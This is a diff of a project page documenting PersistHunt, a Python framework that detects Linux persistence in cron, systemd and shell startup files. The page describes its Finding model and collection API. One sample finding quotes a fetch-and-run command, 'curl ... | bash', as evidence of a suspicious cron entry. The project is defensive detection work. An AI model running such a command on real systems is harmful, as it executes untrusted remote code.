@@ -1,30 +1,92 @@
 ---
-title: persistHunt
-description: >-
-  Linux persistence detection framework. Standardizes host anomaly telemetry
-  across cron schedules, systemd service units, and shell environment
-  initialization vectors.
-status: building
-category: red-team-tooling
+title: Persist Hunt
+description: Linux persistence detection framework. Standardizes host anomaly telemetry across cron schedules, systemd service units, and shell environment initialization vectors
+status: active
+category: detection-engineering
 technologies:
   - Python
-  - Linux Internals
-  - Host Telemetry
-  - Audit Engine
+  - linux
+  - persistent-storage
+  - python3
+  - security-audit
 githubUrl: https://github.com/0xraiven/persistHunt
 screenshots: []
 relatedWriteupSlugs: []
 ---
-## Overview
 
-Persistence Hunter (persistHunt) inspects Linux hosts for covert persistence mechanisms across initialization vectors, daemon definitions, and user environment hooks.
+# PersistHunt
 
-## Key Inspection Surfaces
+PersistHunt is a Linux persistence detection framework written in Python.
 
-- **Systemd**: Analyzes user and system unit directories (`/etc/systemd/system`, `~/.config/systemd/user`) for non-standard triggers and timers.
-- **Cron**: Inspects `/etc/crontab`, `/etc/cron.*`, and spool tables for hidden scheduled executions.
-- **Shell Startup**: Scans `.bashrc`, `.bash_profile`, `/etc/profile.d/`, and fish/zsh configurations for alias hijacking or command injections.
+## Developer Documentation
 
-{% terminal
-   title="persisthunt-scan"
-   commands=[{cmd: "python3 -m persisthunt.audit --target / --level aggressive", output: "[+] Initializing Host Audit Engine\n[*] Scanning systemd service paths...\n[*] Auditing crontab definitions...\n[*] Inspecting shell initialization scripts...\n[!] Finding: 0 anomalous triggers identified in core initialization pathways.\n[+] Audit Complete: Integrity Verified."}] /%}
+### Stage 1: Finding Engine
+
+The finding engine provides a standardized representation for security findings. All future PersistHunt detection modules will use this engine to normalize findings across different persistence types (cron, systemd, SSH, etc.).
+
+#### Finding Model
+
+A `Finding` represents a single security issue detected on the system. It contains the following properties:
+
+- `id`: A unique identifier for the finding type (e.g., `PH-CRON-001`). Provided by the detector.
+- `category`: The security category (e.g., `cron`, `systemd`).
+- `severity`: The severity level, which must be one of the `Severity` enum values.
+- `title`: A short human-readable description.
+- `description`: A detailed explanation of why the finding was generated.
+- `evidence`: (Optional) Evidence causing the detection. Can be a string, structured dictionary, etc.
+- `location`: (Optional) The relevant filesystem location, service, or configuration file.
+- `recommendation`: (Optional) A remediation recommendation.
+
+#### Available Severity Levels
+
+The `Severity` enum provides a controlled set of severity levels:
+- `INFO`
+- `LOW`
+- `MEDIUM`
+- `HIGH`
+- `CRITICAL`
+
+#### Creating a Finding
+
+Detectors can create findings as follows:
+
+```python
+from persisthunt.findings import Finding, Severity
+
+finding = Finding(
+    id="PH-CRON-001",
+    category="cron",
+    severity=Severity.HIGH,
+    title="Suspicious cron entry",
+    description="A cron entry contains a suspicious command.",
+    evidence="curl http://example.com/a.sh | bash",
+    location="/etc/cron.d/example",
+    recommendation="Review and remove the unauthorized cron entry."
+)
+```
+
+#### Finding Collection and Serialization
+
+Findings are grouped into a `FindingCollection`, which provides methods for filtering and analyzing the findings:
+
+```python
+from persisthunt.findings import FindingCollection
+
+collection = FindingCollection()
+collection.add(finding)
+
+# Iterate findings
+for f in collection:
+    print(f.title)
+
+# Filter findings
+high_severity_findings = collection.by_severity(Severity.HIGH)
+cron_findings = collection.by_category("cron")
+
+# Get statistics
+counts = collection.severity_counts()
+print(counts) # {'INFO': 0, 'LOW': 0, 'MEDIUM': 0, 'HIGH': 1, 'CRITICAL': 0}
+
+# Serialize to dictionaries for JSON output
+dict_output = collection.to_dict()
+```
